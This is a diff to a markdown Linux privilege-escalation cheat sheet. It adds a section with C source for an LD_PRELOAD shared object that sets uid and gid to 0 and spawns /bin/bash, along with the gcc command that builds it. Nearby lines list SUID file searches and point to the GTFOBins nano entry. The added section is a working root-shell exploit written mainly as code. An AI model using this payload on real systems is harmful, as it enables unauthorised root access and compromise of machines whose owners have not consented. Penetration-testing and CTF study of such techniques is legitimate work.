@@ -91,6 +91,26 @@ find / -type f -perm -4000 -ls 2>/dev/null  #files with suid permission (long li
 ```
 sudo -l
 ```
+#### Leveraging LD_PRELOAD
+
+```
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+unsetenv("LD_PRELOAD");
+setgid(0);
+setuid(0);
+system("/bin/bash");
+}
+```
+
+```
+gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+```
+
+
 #### Abusing `sudo` permission on `nano`
 The following is extrected from [GTFO bins](https://gtfobins.github.io/gtfobins/nano/)
 ```
